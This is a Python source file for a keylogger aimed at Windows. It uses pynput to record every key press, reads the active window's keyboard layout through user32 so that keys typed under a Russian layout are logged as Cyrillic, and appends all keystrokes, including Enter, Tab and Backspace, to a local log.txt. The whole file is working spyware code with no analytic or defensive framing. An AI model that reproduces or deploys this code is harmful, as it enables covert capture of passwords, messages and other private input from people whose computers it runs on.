from pynput import keyboard
import ctypes

class KeyLogger():
    def __init__(self):
        self.log = ""
        self.eng = "~!@#$%^&*()_+QWERTYUIOP{"+"}ASDFGHJKL:\"|ZXCVBNM<>?`1234567890-=qwertyuiop[]asdfghjkl;'\zxcvbnm,./"
        self.ru = "Ё!\"№;%:?*()_+ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭ/ЯЧСМИТЬБЮ,ё1234567890-=йцукенгшщзхъфывапролджэ\ячсмитьбю."
        self.language = ""
        self.language_codes = {
                                '0x409': 'eng',
                                '0x419': 'ru',
                            }


    # Saving an key to a file 
    def saveElemFile(self):
        file = open("log.txt", "a+")
        print(self.log)
        file.write(self.log)
        file.close()


    # Checking the element for language
    def checkLangElem(self):
        positionElemEng = self.eng.find(self.log)

        if self.language == "ru" and self.log != "" and positionElemEng != -1:
            self.log = self.ru[positionElemEng]
        
        self.saveElemFile()


    # Detecting the keyboard layout
    def detectedKeyboardLayout(self, e):
        user32 = ctypes.WinDLL('user32', use_last_error=True)
        curr_window = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
        klid = user32.GetKeyboardLayout(thread_id)
        lid = klid & (2 ** 16 - 1)
        lid_hex = hex(lid)

        try:
            language = self.language_codes[str(lid_hex)]
        except KeyError:
            language = self.language_codes['0x409'] # English (US)
        
        self.language = language
        self.checkLangElem()


    # Taking the key keyboard
    def takeKey(self, e):
        try:
            name = e.char
        except:
            if e == keyboard.Key.enter:
                name = " [Enter]\n"
            elif e == keyboard.Key.space:
                name = " "
            elif e == keyboard.Key.tab:
                name = " [Tab]\n"
            elif e == keyboard.Key.backspace:
                name = " [Backspace] "
            else:
                name = ""

        self.log = name

    
    # Main function
    def start(self):
        file = open("log.txt", "a+")
        file.write("\n")
        file.close()

        with keyboard.Listener(on_release=self.detectedKeyboardLayout, on_press=self.takeKey) as listener:
             listener.join()


# Starting
if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.start()